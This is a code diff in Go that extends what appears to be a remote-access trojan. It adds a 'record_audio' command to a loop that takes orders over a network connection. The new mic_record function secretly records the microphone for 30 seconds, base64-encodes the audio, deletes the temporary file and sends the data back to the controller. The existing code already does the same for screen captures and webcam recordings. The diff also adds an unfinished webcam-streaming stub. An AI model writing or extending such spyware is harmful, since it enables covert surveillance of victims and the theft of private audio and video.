@@ -3,6 +3,7 @@ package main
 import (
 	"bufio"
 	b64 "encoding/base64"
+	"encoding/binary"
 	"fmt"
 	"image/png"
 	"net"
@@ -12,6 +13,7 @@ import (
 	"time"
 
 	sr "github.com/fstanis/screenresolution"
+	"github.com/gordonklaus/portaudio"
 	"github.com/kbinani/screenshot"
 	"gocv.io/x/gocv"
 )
@@ -99,7 +101,7 @@ func engage_via(conn net.Conn) {
 	for {
 		var cmd, result string
 		conn.Read([]byte(cmd))
-		
+
 		if cmd == "capture_screen" {
 			result = screen_capture()
 			conn.Write([]byte(result))
@@ -111,6 +113,9 @@ func engage_via(conn net.Conn) {
 			conn.Write([]byte(result))
 		} else if cmd == "record_webcam" {
 			result = video_recording(1, 5)
+			conn.Write([]byte(result))
+		} else if cmd == "record_audio" {
+			result = mic_record(30)
 			conn.Write([]byte(result))
 		}
 	}
@@ -214,4 +219,35 @@ func video_recording(tgt int, t int) string {
 	os.Remove(file)
 
 	return result
+}
+
+func mic_record(t int) string {
+	file := "/tmp/audio.wav"
+
+	f, _ := os.Create(file)
+
+	portaudio.Initialize()
+	time.Sleep(1)
+	defer portaudio.Terminate()
+	in := make([]int16, 64)
+	stream, _ := portaudio.OpenDefaultStream(1, 0, 16000, len(in), in)
+	defer stream.Close()
+
+	stream.Start()
+	endTime := time.Now().Add(time.Second * time.Duration(t))
+	for time.Now().Before(endTime) {
+		stream.Read()
+		binary.Write(f, binary.LittleEndian, in)
+	}
+	stream.Stop()
+
+	result := b64_file(file)
+	os.Remove(file)
+
+	return result
+}
+
+func stream_webcam() string {
+	// setup a server to stream from webcam and return the url
+	return ""
 }
